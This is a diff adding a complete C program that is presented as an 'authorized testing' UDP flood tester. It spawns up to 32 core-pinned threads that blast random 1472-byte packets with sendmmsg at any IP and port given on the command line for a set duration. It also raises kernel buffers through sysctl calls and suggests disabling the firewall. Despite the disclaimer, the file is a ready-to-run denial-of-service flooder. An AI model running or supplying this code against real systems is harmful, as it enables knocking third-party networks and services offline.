@@ -1,0 +1,496 @@
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <time.h>
+#include <arpa/inet.h>
+#include <sys/socket.h>
+#include <sys/sysinfo.h>
+#include <pthread.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <sched.h>
+#include <signal.h>
+#include <netinet/udp.h>
+#include <netinet/ip.h>
+
+// OPTIMIZED SETTINGS FOR MAXIMUM THROUGHPUT
+#define THREADS 32           // Match CPU cores
+#define BATCH_SIZE 256       // Increased for better batching
+#define PACKET_SIZE 1472     // Optimal for Ethernet (1500 - 28 bytes overhead)
+#define BUFFER_SIZE (256 * 1024 * 1024)  // 256MB socket buffer
+
+volatile sig_atomic_t running = 1;
+volatile unsigned long long total_packets = 0;
+volatile unsigned long long total_bytes = 0;
+
+// Thread data structure
+typedef struct {
+    char target_ip[INET_ADDRSTRLEN];
+    int port;
+    int core_id;
+    int sock_fd;
+} thread_args_t;
+
+// Signal handler for clean shutdown
+void handle_signal(int sig) {
+    (void)sig;
+    running = 0;
+}
+
+// CPU binding with error checking
+int bind_to_core(int core) {
+    cpu_set_t cpuset;
+    CPU_ZERO(&cpuset);
+    CPU_SET(core, &cpuset);
+    
+    if (pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset) != 0) {
+        fprintf(stderr, "Warning: Failed to bind to core %d\n", core);
+        return -1;
+    }
+    return 0;
+}
+
+// Optimized packet generation
+void fill_packet(char *packet, int size, unsigned int *seed) {
+    // Generate random data quickly
+    for (int i = 0; i < size; i += 4) {
+        unsigned int r = rand_r(seed);
+        if (i + 3 < size) {
+            packet[i] = r & 0xFF;
+            packet[i+1] = (r >> 8) & 0xFF;
+            packet[i+2] = (r >> 16) & 0xFF;
+            packet[i+3] = (r >> 24) & 0xFF;
+        } else {
+            for (int j = 0; j < 4 && i + j < size; j++) {
+                packet[i+j] = (r >> (j*8)) & 0xFF;
+            }
+        }
+    }
+}
+
+// Function to execute system command and ignore return value (for optimizations)
+void execute_system_command(const char *command) {
+    int ret = system(command);
+    // Cast to void to explicitly ignore the return value and avoid warning
+    (void)ret;
+}
+
+// Ultra fast flood using sendmmsg
+void* mega_flood(void* arg) {
+    thread_args_t* args = (thread_args_t*)arg;
+    int core_id = args->core_id;
+    
+    // Bind to specific CPU core
+    bind_to_core(core_id);
+    
+    // Create UDP socket
+    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    if (sock < 0) {
+        perror("socket creation failed");
+        return NULL;
+    }
+    
+    // Store socket fd for potential cleanup
+    args->sock_fd = sock;
+    
+    // EXTREME OPTIMIZATIONS
+    int opt = 1;
+    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
+        perror("setsockopt SO_REUSEADDR failed");
+    }
+    
+    if (setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt)) < 0) {
+        perror("setsockopt SO_REUSEPORT failed");
+    }
+    
+    // Massive send buffer
+    int sndbuf = BUFFER_SIZE;
+    if (setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf)) < 0) {
+        perror("setsockopt SO_SNDBUF failed");
+    }
+    
+    // Non-blocking mode
+    int flags = fcntl(sock, F_GETFL, 0);
+    if (flags != -1) {
+        fcntl(sock, F_SETFL, flags | O_NONBLOCK);
+    }
+    
+    // Prepare target address
+    struct sockaddr_in target;
+    memset(&target, 0, sizeof(target));
+    target.sin_family = AF_INET;
+    target.sin_port = htons(args->port);
+    if (inet_pton(AF_INET, args->target_ip, &target.sin_addr) <= 0) {
+        perror("Invalid target IP");
+        close(sock);
+        return NULL;
+    }
+    
+    // Prepare packets for sendmmsg (allocate on heap for large BATCH_SIZE)
+    struct mmsghdr *msgs = malloc(sizeof(struct mmsghdr) * BATCH_SIZE);
+    struct iovec *iovecs = malloc(sizeof(struct iovec) * BATCH_SIZE);
+    char **packets = malloc(sizeof(char*) * BATCH_SIZE);
+    
+    if (!msgs || !iovecs || !packets) {
+        perror("Memory allocation failed");
+        free(msgs);
+        free(iovecs);
+        free(packets);
+        close(sock);
+        return NULL;
+    }
+    
+    // Initialize packets with random data
+    unsigned int seed = time(NULL) ^ (pthread_self() << 16) ^ (core_id << 8);
+    
+    for (int i = 0; i < BATCH_SIZE; i++) {
+        packets[i] = malloc(PACKET_SIZE);
+        if (!packets[i]) {
+            perror("Packet allocation failed");
+            // Clean up previously allocated packets
+            for (int j = 0; j < i; j++) {
+                free(packets[j]);
+            }
+            free(msgs);
+            free(iovecs);
+            free(packets);
+            close(sock);
+            return NULL;
+        }
+        
+        fill_packet(packets[i], PACKET_SIZE, &seed);
+        
+        iovecs[i].iov_base = packets[i];
+        iovecs[i].iov_len = PACKET_SIZE;
+        
+        memset(&msgs[i], 0, sizeof(struct mmsghdr));
+        msgs[i].msg_hdr.msg_iov = &iovecs[i];
+        msgs[i].msg_hdr.msg_iovlen = 1;
+        msgs[i].msg_hdr.msg_name = &target;
+        msgs[i].msg_hdr.msg_namelen = sizeof(target);
+    }
+    
+    // Main flood loop
+    unsigned long long thread_packets = 0;
+    unsigned long long thread_bytes = 0;
+    int errors = 0;
+    const int MAX_ERRORS = 1000;
+    
+    while (running) {
+        // Send massive batch
+        int sent = sendmmsg(sock, msgs, BATCH_SIZE, 0);
+        
+        if (sent > 0) {
+            thread_packets += sent;
+            thread_bytes += sent * PACKET_SIZE;
+            
+            // Update global counters periodically to reduce contention
+            if (thread_packets >= 10000) {
+                __sync_fetch_and_add(&total_packets, thread_packets);
+                __sync_fetch_and_add(&total_bytes, thread_bytes);
+                thread_packets = 0;
+                thread_bytes = 0;
+            }
+            
+            errors = 0; // Reset error count on success
+        } else if (sent < 0) {
+            if (errno != EAGAIN && errno != EWOULDBLOCK) {
+                errors++;
+                if (errors > MAX_ERRORS) {
+                    fprintf(stderr, "\nThread %d: Too many errors, exiting\n", core_id);
+                    break;
+                }
+            } else {
+                // Resource temporarily unavailable, brief pause
+                usleep(10);
+            }
+        }
+    }
+    
+    // Add remaining packets to global count
+    if (thread_packets > 0) {
+        __sync_fetch_and_add(&total_packets, thread_packets);
+        __sync_fetch_and_add(&total_bytes, thread_bytes);
+    }
+    
+    // Cleanup
+    for (int i = 0; i < BATCH_SIZE; i++) {
+        free(packets[i]);
+    }
+    free(msgs);
+    free(iovecs);
+    free(packets);
+    close(sock);
+    
+    return NULL;
+}
+
+// Statistics printer thread
+void* stats_printer(void* arg) {
+    int duration = *(int*)arg;
+    time_t start_time = time(NULL);
+    time_t last_time = start_time;
+    
+    unsigned long long last_packets = 0;
+    unsigned long long last_bytes = 0;
+    
+    printf("\n[+] Statistics (updates every second):\n");
+    printf("┌────────────┬──────────────┬─────────────┬─────────────┐\n");
+    printf("│    Time    │   Packets/s  │    Speed    │   Total     │\n");
+    printf("├────────────┼──────────────┼─────────────┼─────────────┤\n");
+    
+    while (running && (time(NULL) - start_time) < duration) {
+        sleep(1);
+        
+        time_t current_time = time(NULL);
+        unsigned long long current_packets = total_packets;
+        unsigned long long current_bytes = total_bytes;
+        
+        unsigned long long packets_diff = current_packets - last_packets;
+        unsigned long long bytes_diff = current_bytes - last_bytes;
+        
+        double speed_mbps = (bytes_diff * 8.0) / (1024.0 * 1024.0);
+        double speed_gbps = speed_mbps / 1024.0;
+        
+        double total_gb = current_bytes / (1024.0 * 1024.0 * 1024.0);
+        
+        printf("│ %4ld sec │ %12llu │ %6.2f Gbps │ %6.2f GB │\n",
+               current_time - start_time, packets_diff, speed_gbps, total_gb);
+        fflush(stdout);
+        
+        last_packets = current_packets;
+        last_bytes = current_bytes;
+        last_time = current_time;
+    }
+    
+    printf("└────────────┴──────────────┴─────────────┴─────────────┘\n");
+    running = 0; // Signal all threads to stop
+    
+    return NULL;
+}
+
+// Function to apply system optimizations
+void apply_system_optimizations() {
+    printf("[+] Applying system optimizations...\n");
+    
+    // Increase socket buffer sizes
+    execute_system_command("sysctl -w net.core.wmem_max=268435456 > /dev/null 2>&1");
+    execute_system_command("sysctl -w net.core.rmem_max=268435456 > /dev/null 2>&1");
+    execute_system_command("sysctl -w net.core.wmem_default=268435456 > /dev/null 2>&1");
+    execute_system_command("sysctl -w net.core.rmem_default=268435456 > /dev/null 2>&1");
+    
+    // Increase network backlog
+    execute_system_command("sysctl -w net.core.netdev_max_backlog=500000 > /dev/null 2>&1");
+    
+    // Optimize UDP memory
+    execute_system_command("sysctl -w net.ipv4.udp_mem='1024000 8738000 16777216' > /dev/null 2>&1");
+    
+    // Increase file descriptor limit
+    execute_system_command("ulimit -n 1048576 > /dev/null 2>&1");
+    
+    // Set CPU governor to performance if available
+    execute_system_command("for cpu in /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor; do "
+                          "echo performance > $cpu 2>/dev/null; done");
+    
+    // Check if optimizations were applied
+    FILE *fp = fopen("/proc/sys/net/core/wmem_max", "r");
+    if (fp) {
+        char buffer[64];
+        if (fgets(buffer, sizeof(buffer), fp)) {
+            printf("[+] Socket buffer size: %s", buffer);
+        }
+        fclose(fp);
+    }
+    
+    printf("[+] System optimizations applied (if running as root)\n");
+}
+
+// Function to print system information
+void print_system_info() {
+    struct sysinfo si;
+    if (sysinfo(&si) == 0) {
+        printf("[+] System RAM: %.2f GB total, %.2f GB free\n", 
+               si.totalram / (1024.0 * 1024.0 * 1024.0),
+               si.freeram / (1024.0 * 1024.0 * 1024.0));
+    }
+    
+    // Get network interface info (optional)
+    printf("[+] Checking network interfaces...\n");
+    execute_system_command("ip -brief link show | grep -v LOOPBACK | head -3 2>/dev/null");
+}
+
+int main(int argc, char* argv[]) {
+    // Set up signal handlers
+    signal(SIGINT, handle_signal);
+    signal(SIGTERM, handle_signal);
+    
+    printf("\n╔══════════════════════════════════════════════════════╗\n");
+    printf("║         OPTIMIZED 10Gbps UDP FLOOD TESTER            ║\n");
+    printf("║          FOR AUTHORIZED TESTING ONLY                  ║\n");
+    printf("╚══════════════════════════════════════════════════════╝\n\n");
+    
+    if (argc != 4) {
+        printf("Usage: sudo %s <TARGET_IP> <PORT> <TIME_SECONDS>\n", argv[0]);
+        printf("Example: sudo %s 192.168.1.100 53 30\n\n", argv[0]);
+        printf("WARNING: This tool generates massive traffic!\n");
+        printf("Only use on networks you own or have permission to test.\n");
+        return 1;
+    }
+    
+    char* target_ip = argv[1];
+    int port = atoi(argv[2]);
+    int duration = atoi(argv[3]);
+    
+    // Validate inputs
+    if (port <= 0 || port > 65535) {
+        printf("[-] Invalid port number. Must be between 1 and 65535\n");
+        return 1;
+    }
+    
+    if (duration <= 0) {
+        printf("[-] Invalid duration. Must be positive\n");
+        return 1;
+    }
+    
+    // Get number of CPU cores
+    int num_cores = sysconf(_SC_NPROCESSORS_ONLN);
+    int threads = (num_cores > THREADS) ? THREADS : num_cores;
+    
+    printf("[+] Target IP: %s\n", target_ip);
+    printf("[+] Target Port: %d\n", port);
+    printf("[+] Duration: %d seconds\n", duration);
+    printf("[+] CPU Cores: %d\n", num_cores);
+    printf("[+] Threads: %d\n", threads);
+    printf("[+] Batch Size: %d\n", BATCH_SIZE);
+    printf("[+] Packet Size: %d bytes\n", PACKET_SIZE);
+    printf("[+] Socket Buffer: %d MB\n", BUFFER_SIZE / (1024 * 1024));
+    
+    // Print system info
+    print_system_info();
+    
+    // Check if running as root
+    if (geteuid() != 0) {
+        printf("\n[!] WARNING: Not running as root. Some optimizations may not work.\n");
+        printf("    Run with sudo for maximum performance.\n\n");
+        sleep(2);
+    } else {
+        printf("[+] Running with root privileges - optimizations enabled\n");
+    }
+    
+    // Apply system optimizations
+    apply_system_optimizations();
+    
+    printf("\n[+] Starting %d flood threads...\n", threads);
+    
+    // Create threads
+    pthread_t *threads_array = malloc(sizeof(pthread_t) * threads);
+    thread_args_t *thread_args = malloc(sizeof(thread_args_t) * threads);
+    pthread_t stats_thread;
+    
+    if (!threads_array || !thread_args) {
+        printf("[-] Failed to allocate memory for threads\n");
+        free(threads_array);
+        free(thread_args);
+        return 1;
+    }
+    
+    // Initialize thread arguments
+    for (int i = 0; i < threads; i++) {
+        strncpy(thread_args[i].target_ip, target_ip, INET_ADDRSTRLEN - 1);
+        thread_args[i].target_ip[INET_ADDRSTRLEN - 1] = '\0';
+        thread_args[i].port = port;
+        thread_args[i].core_id = i % num_cores;
+        thread_args[i].sock_fd = -1;
+    }
+    
+    // Start stats thread
+    if (pthread_create(&stats_thread, NULL, stats_printer, &duration) != 0) {
+        printf("[-] Failed to create statistics thread\n");
+        free(threads_array);
+        free(thread_args);
+        return 1;
+    }
+    
+    // Start flood threads
+    int threads_created = 0;
+    for (int i = 0; i < threads; i++) {
+        if (pthread_create(&threads_array[i], NULL, mega_flood, &thread_args[i]) != 0) {
+            printf("[-] Failed to create thread %d\n", i);
+        } else {
+            threads_created++;
+        }
+        usleep(10000); // 10ms stagger to avoid thundering herd
+    }
+    
+    if (threads_created == 0) {
+        printf("[-] No threads could be created. Exiting.\n");
+        free(threads_array);
+        free(thread_args);
+        return 1;
+    }
+    
+    printf("\n[+] Flood started with %d threads! Press Ctrl+C to stop early.\n", threads_created);
+    printf("[+] --------------------------------------------------\n");
+    
+    // Wait for completion or interrupt
+    time_t start_wait = time(NULL);
+    while (running && (time(NULL) - start_wait) < duration) {
+        sleep(1);
+    }
+    
+    running = 0;
+    
+    // Wait for threads to finish
+    printf("\n[+] Stopping threads...\n");
+    for (int i = 0; i < threads_created; i++) {
+        pthread_join(threads_array[i], NULL);
+    }
+    pthread_join(stats_thread, NULL);
+    
+    // Final statistics
+    double total_gb = total_bytes / (1024.0 * 1024.0 * 1024.0);
+    double avg_gbps = (total_gb * 8.0) / duration;
+    double packets_per_sec = (double)total_packets / duration;
+    
+    printf("\n╔══════════════════════════════════════════════════════╗\n");
+    printf("║                    FINAL RESULTS                     ║\n");
+    printf("╠══════════════════════════════════════════════════════╣\n");
+    printf("║ Total packets sent:    %15llu packets   ║\n", total_packets);
+    printf("║ Total data sent:       %15.2f GB        ║\n", total_gb);
+    printf("║ Average throughput:    %15.2f Gbps      ║\n", avg_gbps);
+    printf("║ Duration:              %15d seconds    ║\n", duration);
+    printf("║ Packets per second:    %15.0f pps       ║\n", packets_per_sec);
+    printf("╚══════════════════════════════════════════════════════╝\n");
+    
+    // Performance assessment
+    printf("\n[+] PERFORMANCE ASSESSMENT:\n");
+    if (avg_gbps > 9.0) {
+        printf("    ⭐ EXCELLENT: Reached %.2f Gbps - Near line rate!\n", avg_gbps);
+    } else if (avg_gbps > 7.0) {
+        printf("    ✅ GOOD: Reached %.2f Gbps - Solid performance\n", avg_gbps);
+    } else if (avg_gbps > 5.0) {
+        printf("    👍 FAIR: Reached %.2f Gbps - Decent throughput\n", avg_gbps);
+    } else if (avg_gbps > 2.0) {
+        printf("    ⚠️  LIMITED: Reached %.2f Gbps - Check hardware/network\n", avg_gbps);
+    } else {
+        printf("    ❌ LOW: Only %.2f Gbps - Significant bottlenecks detected\n", avg_gbps);
+    }
+    
+    // Provide optimization suggestions if performance is low
+    if (avg_gbps < 5.0) {
+        printf("\n[+] OPTIMIZATION SUGGESTIONS:\n");
+        printf("    1. Ensure CPU scaling governor is set to 'performance'\n");
+        printf("    2. Disable firewall/iptables during testing\n");
+        printf("    3. Use a dedicated 10Gbps network interface\n");
+        printf("    4. Check for network bottlenecks (switch, cables)\n");
+        printf("    5. Consider increasing BATCH_SIZE in the code\n");
+    }
+    
+    // Cleanup
+    free(threads_array);
+    free(thread_args);
+    
+    return 0;
+}
